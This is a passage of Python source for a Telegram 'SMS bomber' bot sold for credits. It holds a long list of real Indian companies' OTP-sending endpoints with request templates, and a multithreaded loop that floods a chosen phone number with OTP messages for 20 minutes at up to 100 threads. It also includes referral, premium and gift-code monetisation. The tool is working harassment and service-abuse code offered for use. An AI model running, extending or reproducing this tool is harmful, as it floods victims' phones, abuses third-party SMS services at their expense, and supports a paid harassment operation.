1    {"name": "Lenskart", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "NoBroker", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&countryCode=IN"},
    {"name": "PharmEasy", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Wakefit", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Byju's", "url": "https://api.byjus.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Hungama", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
    {"name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_number={p}"},
    {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'},
    {"name": "PenPencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
    {"name": "Snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
    {"name": "Dayco", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"},
    {"name": "BeepKart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","city":362}}'},
    {"name": "LendingPlate", "url": "https://lendingplate.com/api.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobiles={p}&resend=Resend"},
    {"name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "GoKwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","country":"in"}}'},
    {"name": "NewMe", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'},
    {"name": "Univest", "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "Smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","email":"test@example.com"}}'},
    {"name": "CaratLane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{p}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}}}'},
    {"name": "BikeFixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'},
    {"name": "WellAcademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"contact_no":"{p}"}}'},
    {"name": "ServeTel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_number={p}"},
    {"name": "GoPink", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"check_mobile_number=1&contact={p}"},
    {"name": "Shemaroome", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_no=%2B91{p}"},
    {"name": "Cossouq", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobilenumber={p}&otptype=register"},
    {"name": "MyImagine", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile={p}"},
    {"name": "Otpless", "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","selectedCountryCode":"+91"}}'},
    {"name": "MyHubble", "url": "https://api.myhubble.money/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}","channel":"SMS"}}'},
    {"name": "Tata Capital Biz", "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'},
    {"name": "DealShare", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","hashCode":"k387IsBaTmn"}}'},
    {"name": "Snapmint", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Housing", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'},
    {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"wk+avHrHZf2"}}'},
    {"name": "Netmeds", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Nykaa", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"source=sms&app_version=3.0.9&mobile_number={p}&platform=ANDROID&domain=nykaa"},
    {"name": "RummyCircle", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","isPlaycircle":false}}'},
    {"name": "Animall", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","signupPlatform":"NATIVE_ANDROID"}}'},
    {"name": "PenPencil V3", "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Entri", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Cosmofeed", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","version":"1.4.28"}}'},
    {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}","activity_type":"aakash-myadmission"}}'},
    {"name": "Revv", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","deviceType":"website"}}'},
    {"name": "DeHaat", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","client_id":"kisan-app"}}'},
    {"name": "A23 Games", "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'},
    {"name": "Spencer's", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "PayMe India", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"S10ePIIrbH3"}}'},
    {"name": "Shopper's Stop", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'},
    {"name": "Hyuga", "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "BigCash", "url": lambda p: f"https://www.bigcash.live/sendsms.php?mobile={p}&ip=192.168.1.1", "method": "GET", "headers": {"Referer": "https://www.bigcash.live/games/poker"}, "data": None},
    {"name": "Lifestyle", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"signInMobile":"{p}","channel":"sms"}}'},
    {"name": "WorkIndia", "url": lambda p: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={p}&version_number=623", "method": "GET", "headers": {}, "data": None},
    {"name": "PokerBaazi", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","mfa_channels":"phno"}}'},
    {"name": "My11Circle", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "MamaEarth", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "HomeTriangle", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Wellness Forever", "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"method=firstRegisterApi&data={{\"customerMobile\":\"{p}\",\"generateOtp\":\"true\"}}"},
    {"name": "HealthMug", "url": "https://api.healthmug.com/account/createotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Vyapar", "url": lambda p: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "Kredily", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Tata Motors", "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","sendOtp":"true"}}'},
    {"name": "Moglix", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","buildVersion":"24.0"}}'},
    {"name": "MyGov", "url": lambda p: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={p}&gender=male", "method": "GET", "headers": {}, "data": None},
    {"name": "TrulyMadly", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","locale":"IN"}}'},
    {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","hash_type":"play_store"}}'},
    {"name": "CodFirm", "url": lambda p: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{p}&email=&storeUrl=bellavita1.myshopify.com", "method": "GET", "headers": {}, "data": None},
    {"name": "Swipe", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","resend":true}}'},
    {"name": "More Retail", "url": "https://omni-api.moreretail.in/api/v1/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","hash_key":"XfsoCeXADQA"}}'},
    {"name": "Country Delight", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","platform":"Android","mode":"new_user"}}'},
    {"name": "AstroSage", "url": lambda p: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "Rapido", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "TooToo", "url": "https://tootoo.in/graphql", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{p}","resend":0}}}}'},
    {"name": "ConfirmTkt", "url": lambda p: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={p}", "method": "GET", "headers": {}, "data": None},
    {"name": "BetterHalf", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","isd_code":"91"}}'},
    {"name": "Charzer", "url": "https://api.charzer.com/auth-service/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","appSource":"CHARZER_APP"}}'},
    {"name": "Nuvama", "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNo":"{p}","emailID":"test@example.com"}}'},
    {"name": "Mpokket", "url": "https://web-api.mpokket.in/registration/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
]

# ==================== FILE OPERATIONS ====================
def init_files():
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, "w") as f:
            json.dump({}, f)
    if not os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, "w") as f:
            json.dump({
                "bot_active": True, 
                "channels": CHANNELS, 
                "channel_links": CHANNEL_LINKS, 
                "owner_username": OWNER_USERNAME, 
                "credit_prices": CREDIT_PRICES, 
                "premium_price": PREMIUM_PRICE,
                "main_bot_token": DEFAULT_MAIN_BOT_TOKEN,
                "admin_bot_token": DEFAULT_ADMIN_BOT_TOKEN
            }, f)
    if not os.path.exists(ADMINS_FILE):
        with open(ADMINS_FILE, "w") as f:
            json.dump([OWNER_ID], f)
    if not os.path.exists(APIS_FILE):
        with open(APIS_FILE, "w") as f:
            api_data = [{"id": i, "name": api["name"], "url": str(api["url"]), "method": api["method"], "headers": api["headers"], "data": str(api["data"]), "active": True} for i, api in enumerate(ULTIMATE_APIS)]
            json.dump(api_data, f, indent=2)
    if not os.path.exists(BLOCKED_FILE):
        with open(BLOCKED_FILE, "w") as f:
            json.dump([], f)
    if not os.path.exists(GIFTCODES_FILE):
        with open(GIFTCODES_FILE, "w") as f:
            json.dump({}, f)

init_files()

def load_json(file):
    try:
        with open(file, "r") as f:
            return json.load(f)
    except:
        return {} if file != BLOCKED_FILE and file != ADMINS_FILE else []

def save_json(file, data):
    with open(file, "w") as f:
        json.dump(data, f, indent=2)

users = load_json(USERS_FILE)
settings = load_json(SETTINGS_FILE)
admins = load_json(ADMINS_FILE)
apis_db = load_json(APIS_FILE)
blocked = load_json(BLOCKED_FILE)
giftcodes = load_json(GIFTCODES_FILE)

MAIN_BOT_TOKEN = settings.get("main_bot_token", DEFAULT_MAIN_BOT_TOKEN)
ADMIN_BOT_TOKEN = settings.get("admin_bot_token", DEFAULT_ADMIN_BOT_TOKEN)

bot = telebot.TeleBot(MAIN_BOT_TOKEN, parse_mode="HTML")
admin_bot = telebot.TeleBot(ADMIN_BOT_TOKEN, parse_mode="HTML")

logger.info(f"✅ Main bot: @{bot.get_me().username}")
logger.info(f"✅ Admin bot: @{admin_bot.get_me().username}")

# ==================== GIFT CODE SYSTEM ====================
def generate_gift_code(length=8):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def create_gift_code(credits, uses=1, expires_days=None):
    code = generate_gift_code()
    while code in giftcodes:
        code = generate_gift_code()
    
    expiry = None
    if expires_days:
        expiry = (datetime.now() + timedelta(days=expires_days)).isoformat()
    
    giftcodes[code] = {
        "credits": credits,
        "max_uses": uses,
        "used_by": [],
        "created": datetime.now().isoformat(),
        "expires": expiry
    }
    save_json(GIFTCODES_FILE, giftcodes)
    return code

def redeem_gift_code(user_id, code):
    code = code.upper()
    if code not in giftcodes:
        return {"success": False, "message": "❌ Invalid gift code!"}
    
    gift = giftcodes[code]
    uid = str(user_id)
    
    if gift["expires"] and datetime.now() > datetime.fromisoformat(gift["expires"]):
        return {"success": False, "message": "❌ Gift code expired!"}
    
    if len(gift["used_by"]) >= gift["max_uses"]:
        return {"success": False, "message": "❌ Gift code fully used!"}
    
    if uid in gift["used_by"]:
        return {"success": False, "message": "❌ You already used this code!"}
    
    if uid not in users:
        users[uid] = {"credits": 0, "joined": str(datetime.now())}
    
    users[uid]["credits"] = users[uid].get("credits", 0) + gift["credits"]
    gift["used_by"].append(uid)
    
    save_json(USERS_FILE, users)
    save_json(GIFTCODES_FILE, giftcodes)
    
    return {"success": True, "message": f"🎁 Success! +{gift['credits']} credits added!"}

# ==================== HELPER FUNCTIONS ====================
def is_admin(uid):
    return uid in admins or uid == OWNER_ID

def is_blocked(uid):
    return uid in blocked

def is_premium(uid):
    uid = str(uid)
    if uid not in users:
        return False
    if "premium_until" not in users[uid]:
        return False
    expiry = datetime.fromisoformat(users[uid]["premium_until"])
    return datetime.now() < expiry

def get_unlocked_speeds(uid):
    uid = str(uid)
    if uid not in users:
        return ["1x", "2x", "3x"]
    
    if is_premium(int(uid)):
        return list(SPEED_CONFIGS.keys())
    
    unlocked = users[uid].get("unlocked_speeds", ["1x", "2x", "3x"])
    return unlocked

def check_channel(uid):
    channels = settings.get("channels", CHANNELS)
    for ch in channels.values():
        try:
            status = bot.get_chat_member(ch, uid).status
            if status in ["left", "kicked"]:
                return False
        except:
            return False
    return True

def show_join(chat_id):
    channels = settings.get("channels", CHANNELS)
    links = settings.get("channel_links", CHANNEL_LINKS)
    
    kb = types.InlineKeyboardMarkup()
    for name, ch in channels.items():
        kb.add(types.InlineKeyboardButton(f"Join {name.title()}", url=links[name]))
    kb.add(types.InlineKeyboardButton("✅ Verify", callback_data="verify"))
    
    bot.send_message(chat_id, "⚠️ <b>Join all channels first!</b>", reply_markup=kb)

def main_kb():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.row("🚀 Start", "💰 My Credits")
    kb.row("📊 Stats", "🔗 Refer")
    kb.row("💳 Buy Credits & Premium", "❓ Help")
    kb.row("🎁 Redeem Code", "📞 Owner")
    return kb

# ==================== 💣 HARDCORE BOMBING SYSTEM 💣 ====================

def hit_api_sync(api, phone):
    """Synchronous API hit for ThreadPoolExecutor"""
    try:
        url = api["url"](phone) if callable(api["url"]) else api["url"]
        headers = api["headers"]
        method = api["method"]
        data_func = api["data"]
        data = data_func(phone) if data_func else None
        
        if method == "POST":
            resp = requests.post(url, headers=headers, data=data, timeout=5)
        else:
            resp = requests.get(url, headers=headers, timeout=5)
        
        return resp.status_code in [200, 201]
    except:
        return False

def hardcore_bombing_wave(phone, apis, threads, stats):
    """Single wave of bombing with ThreadPoolExecutor"""
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        
        # Submit all API calls
        for api in apis:
            future = executor.submit(hit_api_sync, api, phone)
            futures.append(future)
        
        # Collect results
        for future in as_completed(futures):
            try:
                success = future.result()
                stats["total"] += 1
                if success:
                    stats["success"] += 1
                else:
                    stats["fail"] += 1
            except:
                stats["fail"] += 1
                stats["total"] += 1

def hardcore_bombing_task(phone, chat_id, msg_id, speed_key):
    """🔥 HARDCORE BOMBING with real multi-threading"""
    active_tasks[chat_id] = {"running": True}
    stats = {"success": 0, "fail": 0, "total": 0}
    
    config = SPEED_CONFIGS[speed_key]
    multiplier = config["multiplier"]
    threads = config["threads"]
    delay = config["delay"]
    label = config["label"]
    
    active_apis = ULTIMATE_APIS
    
    start_time = time.time()
    duration = 20 * 60  # 20 minutes
    wave_count = 0
    
    while active_tasks[chat_id]["running"] and (time.time() - start_time) < duration:
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed
        
        mins = remaining // 60
        secs = remaining % 60
        
        progress = (elapsed / duration) * 100
        bar = "█" * int(progress / 5) + "░" * (20 - int(progress / 5))
        
        # 💣 PERFORM MULTIPLE BOMBING WAVES
        for wave in range(multiplier):
            if not active_tasks[chat_id]["running"]:
                break
            
            hardcore_bombing_wave(phone, active_apis, threads, stats)
            wave_count += 1
            
            if delay > 0:
                time.sleep(delay)
        
        # Update status
        status_msg = f"""
🔥 <b>HARDCORE BOMBING ACTIVE</b>

📱 Target: <code>{phone}</code>
⚡ Mode: <b>{speed_key} {label}</b>
🧵 Threads: <b>{threads}</b>
🌊 Waves: <b>{wave_count}</b>

⏱️ Time Left: <b>{mins}m {secs}s</b>
{bar} {progress:.1f}%

📊 <b>Damage Report:</b>
✅ Success: <b>{stats['success']}</b>
❌ Failed: <b>{stats['fail']}</b>
🎯 Total Hits: <b>{stats['total']}</b>
💥 Hits/Min: <b>{int(stats['total']/(elapsed/60)) if elapsed > 0 else 0}</b>

💀 Target phone is being DESTROYED!
"""
        
        try:
            bot.edit_message_text(status_msg, chat_id, msg_id, 
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("🛑 Stop", callback_data=f"stop_{chat_id}")
                ))
        except:
            pass
        
        time.sleep(2)
    
    # Final report
    total_time = int(time.time() - start_time)
    final_msg = f"""
✅ <b>BOMBING COMPLETED!</b>

📱 Number: <code>{phone}</code>
⚡ Mode: <b>{speed_key} {label}</b>
⏱️ Duration: {total_time//60}m {total_time%60}s

📊 <b>Final Damage:</b>
✅ Successful: <b>{stats['success']}</b>
❌ Failed: <b>{stats['fail']}</b>
🎯 Total Requests: <b>{stats['total']}</b>
🌊 Total Waves: <b>{wave_count}</b>
💥 Average: <b>{int(stats['total']/(total_time/60))} hits/min</b>

💰 Credits used: {config['credits']}
"""
    try:
        bot.edit_message_text(final_msg, chat_id, msg_id)
    except:
        pass
    
    if chat_id in active_tasks:
        del active_tasks[chat_id]


# ==================== MAIN BOT HANDLERS ====================
@bot.message_handler(commands=["start"])
def start_cmd(m):
    if is_blocked(m.from_user.id):
        bot.reply_to(m, "🚫 <b>You are blocked!</b>")
        return
    if not settings.get("bot_active", True):
        bot.reply_to(m, "⚠️ <b>Bot is under maintenance!</b>")
        return
    if not check_channel(m.from_user.id):
        show_join(m.chat.id)
        return
    
    uid = str(m.from_user.id)
    if uid not in users:
        users[uid] = {"credits": START_CREDITS, "joined": str(datetime.now()), "unlocked_speeds": ["1x", "2x", "3x"]}
        
        args = m.text.split()
        if len(args) == 2 and args[1].startswith("ref_"):
            ref_id = args[1].replace("ref_", "")
            if ref_id in users and ref_id != uid:
                users[ref_id]["credits"] = users[ref_id].get("credits", 0) + REF_CREDITS
                try:
                    bot.send_message(int(ref_id), f"🎉 <b>+{REF_CREDITS} credits!</b>\n\nNew referral joined!")
                except:
                    pass
        save_json(USERS_FILE, users)
    
    credits = users[uid].get("credits", 0)
    premium_status = "✅ Active" if is_premium(m.from_user.id) else "❌ Not Active"
    
    bot.send_message(m.chat.id, f"""
👋 <b>Welcome to HARDCORE CRASH BOMBER!</b>

💰 Credits: <b>{credits}</b>
👑 Premium: {premium_status}

⚡ <b>HARDCORE CRASH SYSTEM:</b>
• 1x = 5 threads (Normal)
• 2x = 10 threads (Fast)
• 3x = 15 threads (Very Fast)
• 5x = 25 threads (Extreme)
• 10x = 50 threads (CRASH MODE)
• 20x = 100 threads (NUCLEAR!) 💀

📱 <b>How to use:</b>
Send a 10-digit phone number!

💡 Higher speed = More threads = HARDER CRASH!
""", reply_markup=main_kb())

@bot.callback_query_handler(func=lambda c: c.data == "verify")
def verify_cb(c):
    if check_channel(c.from_user.id):
        bot.answer_callback_query(c.id, "✅ Verified!")
        bot.delete_message(c.message.chat.id, c.message.message_id)
        start_cmd(c.message)
    else:
        bot.answer_callback_query(c.id, "❌ Join all channels first!", show_alert=True)

@bot.callback_query_handler(func=lambda c: c.data.startswith("stop_"))
def stop_cb(c):
    chat_id = int(c.data.replace("stop_", ""))
    if chat_id in active_tasks:
        active_tasks[chat_id]["running"] = False
        bot.answer_callback_query(c.id, "🛑 Stopping...")
    else:
        bot.answer_callback_query(c.id, "No active task!")

@bot.callback_query_handler(func=lambda c: c.data.startswith("crash_"))
def crash_select_cb(c):
    try:
        parts = c.data.split("_")
        speed = parts[1] + "x"
        phone = parts[2]
        
        uid = str(c.from_user.id)
        unlocked = get_unlocked_speeds(c.from_user.id)
        
        if speed not in unlocked:
            bot.answer_callback_query(c.id, f"🔒 {speed} locked! Get Premium!", show_alert=True)
            return
        
        credits = users[uid].get("credits", 0)
        cost = SPEED_CONFIGS[speed]["credits"]
        
        if credits < cost:
            bot.answer_callback_query(c.id, f"❌ Need {cost} credits!", show_alert=True)
            return
        
        users[uid]["credits"] = credits - cost
        save_json(USERS_FILE, users)
        
        bot.answer_callback_query(c.id, f"💣 Starting {speed} CRASH MODE!")
        
        wait_msg = bot.edit_message_text(
            f"💣 <b>Starting {speed} HARDCORE CRASH...</b>\n\n📱 Target: {phone}", 
            c.message.chat.id, c.message.message_id
        )
        
        # Start in background thread
        threading.Thread(
            target=hardcore_bombing_task, 
            args=(phone, c.message.chat.id, wait_msg.message_id, speed), 
            daemon=True
        ).start()
        
    except Exception as e:
        bot.answer_callback_query(c.id, f"❌ Error: {e}")

@bot.message_handler(commands=["redeem"])
def redeem_cmd(m):
    if is_blocked(m.from_user.id):
        return
    bot.reply_to(m, "🎁 <b>Redeem Gift Code</b>\n\nSend code:")
    bot.register_next_step_handler(m, process_redeem)

def process_redeem(m):
    code = m.text.strip().upper()
    result = redeem_gift_code(m.from_user.id, code)
    bot.reply_to(m, result["message"])

@bot.message_handler(func=lambda m: m.text == "🎁 Redeem Code")
def redeem_button(m):
    redeem_cmd(m)

@bot.message_handler(func=lambda m: m.text == "🚀 Start")
def start_button(m):
    start_cmd(m)

@bot.message_handler(func=lambda m: m.text and m.text.isdigit() and len(m.text) == 10)
def number_handler(m):
    if is_blocked(m.from_user.id):
        bot.reply_to(m, "🚫 Blocked!")
        return
    if not check_channel(m.from_user.id):
        show_join(m.chat.id)
        return
    
    uid = str(m.from_user.id)
    if uid not in users:
        users[uid] = {"credits": 0, "joined": str(datetime.now()), "unlocked_speeds": ["1x", "2x", "3x"]}
        save_json(USERS_FILE, users)
    
    credits = users[uid].get("credits", 0)
    if credits < 1:
        bot.reply_to(m, "❌ <b>No credits!</b>\n\nBuy or refer friends.")
        return
    
    phone = m.text
    unlocked = get_unlocked_speeds(m.from_user.id)
    
    kb = types.InlineKeyboardMarkup()
    row = []
    
    for speed, config in SPEED_CONFIGS.items():
        cost = config["credits"]
        threads = config["threads"]
        label = config["label"]
        
        if speed in unlocked:
            btn_label = f"⚡{speed} {label}\n({threads} threads-{cost}💰)"
        else:
            btn_label = f"🔒{speed}"
        
